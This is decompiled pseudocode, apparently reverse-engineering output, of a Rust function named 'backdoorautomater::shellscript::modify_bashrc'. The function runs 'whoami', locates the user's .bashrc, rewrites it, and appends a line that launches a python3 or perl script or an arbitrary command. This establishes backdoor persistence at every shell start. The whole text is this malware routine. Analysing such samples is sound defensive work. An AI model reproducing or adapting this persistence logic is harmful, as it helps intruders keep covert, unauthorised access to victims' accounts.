__int64 __fastcall backdoorautomater::shellscript::modify_bashrc(__int64 a1, int a2)
{
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // r14
  __int64 v8; // rbp
  __int128 v9; // xmm0
  __int128 v10; // xmm0
  char v11; // bp
  unsigned int v12; // [rsp+4h] [rbp-314h] BYREF
  __int64 v13; // [rsp+8h] [rbp-310h]
  __int128 v14; // [rsp+10h] [rbp-308h] BYREF
  __int64 v15; // [rsp+20h] [rbp-2F8h]
  __int128 v16; // [rsp+48h] [rbp-2D0h] BYREF
  __int64 v17; // [rsp+58h] [rbp-2C0h]
  __int128 v18; // [rsp+60h] [rbp-2B8h] BYREF
  __int64 v19; // [rsp+70h] [rbp-2A8h]
  _QWORD v20[3]; // [rsp+78h] [rbp-2A0h] BYREF
  __int128 v21; // [rsp+90h] [rbp-288h] BYREF
  __int64 v22; // [rsp+A0h] [rbp-278h]
  __int128 v23; // [rsp+B0h] [rbp-268h] BYREF
  __int64 v24; // [rsp+C0h] [rbp-258h]
  int v25; // [rsp+D4h] [rbp-244h]
  unsigned __int64 v26; // [rsp+D8h] [rbp-240h]
  __int128 v27; // [rsp+E0h] [rbp-238h] BYREF
  __m256i v28; // [rsp+F0h] [rbp-228h]
  __int128 v29; // [rsp+1B0h] [rbp-168h] BYREF
  __int64 v30; // [rsp+1C0h] [rbp-158h]
  __int128 v31; // [rsp+1D0h] [rbp-148h] BYREF
  __int64 v32; // [rsp+1E0h] [rbp-138h]
  _BYTE v33[24]; // [rsp+1F0h] [rbp-128h] BYREF
  __int128 v34; // [rsp+210h] [rbp-108h] BYREF
  __int64 v35; // [rsp+220h] [rbp-F8h]
  char v36[8]; // [rsp+228h] [rbp-F0h] BYREF
  __int64 v37; // [rsp+230h] [rbp-E8h]
  __int64 v38; // [rsp+238h] [rbp-E0h]
  __int64 v39; // [rsp+248h] [rbp-D0h]
  __int64 v40; // [rsp+250h] [rbp-C8h]
  __int128 v41; // [rsp+260h] [rbp-B8h] BYREF
  __int64 v42; // [rsp+270h] [rbp-A8h]
  __int128 v43; // [rsp+280h] [rbp-98h] BYREF
  __int64 v44; // [rsp+290h] [rbp-88h]
  __int128 v45; // [rsp+2A0h] [rbp-78h] BYREF
  __m256i v46; // [rsp+2B0h] [rbp-68h]
  _BYTE v47[72]; // [rsp+2D0h] [rbp-48h] BYREF

  v13 = a1;
  *(_QWORD *)&v27 = &off_22A890;
  *((_QWORD *)&v27 + 1) = 1LL;
  v28.m256i_i64[0] = 8LL;
  *(_OWORD *)&v28.m256i_u64[1] = 0LL;
  std::io::stdio::_print(&v27);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v27, aWhoami);
  v30 = v28.m256i_i64[0];
  v29 = v27;
  std::process::Command::new(&v27, aSh_2, 2LL);
  v2 = std::process::Command::arg(&v27, aC_4, 2LL);
  v3 = std::process::Command::arg(v2, &v29);
  std::process::Command::output(&v14, v3);
  core::result::Result<T,E>::expect(v36, &v14, &off_22A8A0);
  core::ptr::drop_in_place<std::process::Command>(&v27);
  alloc::string::String::from_utf8_lossy(&v14, v39, v40);
  v4 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v14);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v27, v4);
  v32 = v28.m256i_i64[0];
  v31 = v27;
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v14);
  backdoorautomater::sanitizer::sanitize_system_command((__int64)&v31);
  alloc::string::String::from_utf8_lossy(&v14, v37, v38);
  v5 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v14);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v27, v5);
  *(_QWORD *)&v33[16] = v28.m256i_i64[0];
  *(_OWORD *)v33 = v27;
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v14);
  *(_QWORD *)&v27 = aHome;
  *((_QWORD *)&v27 + 1) = 6LL;
  *(_OWORD *)v28.m256i_i8 = *(_OWORD *)&v33[8];
  alloc::str::join_generic_copy(&v14, &v27, 2LL, 1LL, 0LL);
  v22 = v15;
  v21 = v14;
  alloc::str::<impl str>::replace(&v27, *((_QWORD *)&v14 + 1));
  core::ptr::drop_in_place<alloc::string::String>(&v21);
  v22 = v28.m256i_i64[0];
  v21 = v27;
  alloc::vec::Vec<T,A>::extend_from_slice(&v21, aBashrc, 8LL);
  std::fs::File::open(&v27, &v21);
  if ( (_DWORD)v27 )
  {
    v6 = *((_QWORD *)&v27 + 1);
LABEL_3:
    core::ptr::drop_in_place<alloc::string::String>(&v21);
LABEL_4:
    core::ptr::drop_in_place<alloc::string::String>(v33);
    core::ptr::drop_in_place<alloc::string::String>(&v31);
    core::ptr::drop_in_place<std::process::Output>(v36);
    core::ptr::drop_in_place<alloc::string::String>(&v29);
    goto LABEL_5;
  }
  std::io::buffered::bufreader::BufReader<R>::with_capacity(&v45, 0x2000LL, DWORD1(v27));
  v25 = a2;
  v20[0] = 0LL;
  v20[1] = 8LL;
  v20[2] = 0LL;
  v28 = v46;
  v27 = v45;
  v26 = 0x8000000000000001LL;
  while ( 1 )
  {
    <std::io::Lines<B> as core::iter::traits::iterator::Iterator>::next(&v14, &v27);
    v8 = v14;
    if ( (_QWORD)v14 == v26 )
      break;
    v6 = *((_QWORD *)&v14 + 1);
    if ( (_QWORD)v14 == 0x8000000000000000LL )
    {
      core::ptr::drop_in_place<std::io::Lines<std::io::buffered::bufreader::BufReader<std::fs::File>>>(&v27);
      goto LABEL_13;
    }
    v34 = v14;
    v35 = v15;
    alloc::vec::Vec<T,A>::push(v20, &v34);
  }
  core::ptr::drop_in_place<std::io::Lines<std::io::buffered::bufreader::BufReader<std::fs::File>>>(&v27);
  v28.m256i_i64[0] = v22;
  v27 = v21;
  std::fs::File::create(&v14, &v27);
  if ( (_DWORD)v14 )
  {
    v6 = *((_QWORD *)&v14 + 1);
LABEL_13:
    core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(v20);
    if ( v8 != v26 )
      goto LABEL_3;
    goto LABEL_4;
  }
  v12 = DWORD1(v14);
  if ( (_BYTE)v25 == 1 )
  {
    v10 = *(_OWORD *)(v13 + 8);
    *(_QWORD *)&v27 = aPython3;
    *((_QWORD *)&v27 + 1) = 8LL;
    *(_OWORD *)v28.m256i_i8 = v10;
    alloc::str::join_generic_copy(&v14, &v27, 2LL, 1LL, 0LL);
    v24 = v15;
    v23 = v14;
    alloc::vec::Vec<T,A>::extend_from_slice(&v23, asc_1670EF, 2LL);
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v27, asc_1670F1);
    v42 = v28.m256i_i64[0];
    v41 = v27;
    alloc::vec::Vec<T,A>::push(v20, &v41);
    v28.m256i_i64[0] = v24;
    v27 = v23;
    alloc::vec::Vec<T,A>::push(v20, &v27);
    <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v27, v20);
    <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v16, &v27);
    while ( (_QWORD)v16 != 0x8000000000000000LL )
    {
      v19 = v17;
      v18 = v16;
      <alloc::string::String as core::clone::Clone>::clone(&v14, &v18);
      alloc::vec::Vec<T,A>::extend_from_slice(&v14, asc_1670F1, 1LL);
      v6 = std::io::Write::write_all(&v12, *((_QWORD *)&v14 + 1), v15);
      if ( v6 )
        goto LABEL_34;
      core::ptr::drop_in_place<alloc::string::String>(&v14);
      core::ptr::drop_in_place<alloc::string::String>(&v18);
      <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v16, &v27);
    }
  }
  else if ( (unsigned __int8)v25 == 2 )
  {
    v9 = *(_OWORD *)(v13 + 8);
    *(_QWORD *)&v27 = aPerl;
    *((_QWORD *)&v27 + 1) = 5LL;
    *(_OWORD *)v28.m256i_i8 = v9;
    alloc::str::join_generic_copy(&v14, &v27, 2LL, 1LL, 0LL);
    v24 = v15;
    v23 = v14;
    alloc::vec::Vec<T,A>::extend_from_slice(&v23, asc_1670EF, 2LL);
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v27, asc_1670F1);
    v44 = v28.m256i_i64[0];
    v43 = v27;
    alloc::vec::Vec<T,A>::push(v20, &v43);
    v28.m256i_i64[0] = v24;
    v27 = v23;
    alloc::vec::Vec<T,A>::push(v20, &v27);
    <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v27, v20);
    <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v16, &v27);
    while ( (_QWORD)v16 != 0x8000000000000000LL )
    {
      v19 = v17;
      v18 = v16;
      <alloc::string::String as core::clone::Clone>::clone(&v14, &v18);
      alloc::vec::Vec<T,A>::extend_from_slice(&v14, asc_1670F1, 1LL);
      v6 = std::io::Write::write_all(&v12, *((_QWORD *)&v14 + 1), v15);
      if ( v6 )
        goto LABEL_34;
      core::ptr::drop_in_place<alloc::string::String>(&v14);
      core::ptr::drop_in_place<alloc::string::String>(&v18);
      <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v16, &v27);
    }
  }
  else
  {
    if ( (unsigned __int8)v25 != 3 )
    {
      v11 = 0;
      goto LABEL_31;
    }
    <alloc::string::String as core::clone::Clone>::clone(v47, v13);
    alloc::vec::Vec<T,A>::push(v20, v47);
    <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v27, v20);
    <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v16, &v27);
    if ( (_QWORD)v16 != 0x8000000000000000LL )
    {
      while ( 1 )
      {
        v19 = v17;
        v18 = v16;
        <alloc::string::String as core::clone::Clone>::clone(&v14, &v18);
        alloc::vec::Vec<T,A>::extend_from_slice(&v14, asc_1670F1, 1LL);
        v6 = std::io::Write::write_all(&v12, *((_QWORD *)&v14 + 1), v15);
        if ( v6 )
          break;
        core::ptr::drop_in_place<alloc::string::String>(&v14);
        core::ptr::drop_in_place<alloc::string::String>(&v18);
        <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v16, &v27);
        if ( (_QWORD)v16 == 0x8000000000000000LL )
          goto LABEL_29;
      }
LABEL_34:
      core::ptr::drop_in_place<alloc::string::String>(&v14);
      core::ptr::drop_in_place<alloc::string::String>(&v18);
      core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&v27);
      core::ptr::drop_in_place<std::fs::File>(v12);
      goto LABEL_4;
    }
  }
LABEL_29:
  core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&v27);
  v11 = 1;
LABEL_31:
  core::ptr::drop_in_place<std::fs::File>(v12);
  if ( !v11 )
    core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(v20);
  core::ptr::drop_in_place<alloc::string::String>(v33);
  core::ptr::drop_in_place<alloc::string::String>(&v31);
  core::ptr::drop_in_place<std::process::Output>(v36);
  core::ptr::drop_in_place<alloc::string::String>(&v29);
  v6 = 0LL;
LABEL_5:
  core::ptr::drop_in_place<alloc::string::String>(v13);
  return v6;
}